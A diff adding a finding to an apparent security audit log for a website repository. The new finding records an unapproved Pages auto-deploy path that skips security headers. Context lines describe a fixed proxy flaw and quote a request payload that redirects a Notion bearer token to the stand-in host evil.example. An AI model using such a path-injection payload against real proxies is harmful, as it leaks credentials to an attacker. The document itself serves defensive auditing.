@@ -40,3 +40,11 @@ The same two integrity checks also failed on `a2252901` and `6300df45`. Local re
 ## O4. Mentor proxy credential redirection (source-level, reproduced locally)
 
 Against `project/proxy-deploy/src/index.js` at `d981a1d9`, a `POST /call` with a valid proxy token and `{"target":"notion","path":"@evil.example/collect"}` made the Worker fetch host `evil.example` with the injected `Authorization: Bearer <NOTION_TOKEN>` header. After the fix in this change the same request returns `400` and makes no upstream fetch. Whether a deployed `kr-mentor-proxy` exists, and at which source, is UNVERIFIED.
+
+## O5. Ungoverned deploy path confirmed: Pages Git integration (2026-10-09T18:48Z)
+
+When this PR's branch was pushed, `cloudflare-workers-and-pages[bot]` commented on ChaosClubCo/abstrekkt#133 (comment 6087167425), saying it had deployed commit `70c38c2` as preview `https://128144e5.abstrekkt.pages.dev`. Nobody dispatched a workflow. Status-only probes of that preview:
+- `/` and `/founder/` return `200`, and the bytes are the package files. There is no `X-Frame-Options` and no `X-Abstrekkt-Release`. The committed `Link` header is present.
+- `/repository-registry.yaml`, `/REPOSITORY.md`, `/00-master-index.md`, `/.gitignore`, `/project/CANON.md`, `/docs/release/RELEASE_CHECKLIST.md` and `/project/deploy/abstrekkt-com/index.html` all return `404`.
+
+Conclusion: Git integration builds with output directory `project/deploy/abstrekkt-com`. The rest of the private tree is not published at those paths (SUPPORTED, sampled paths only). This confirms O1's inference: pushes to the production branch are auto-deployed outside the governed workflow, without its gates, security headers or receipt.
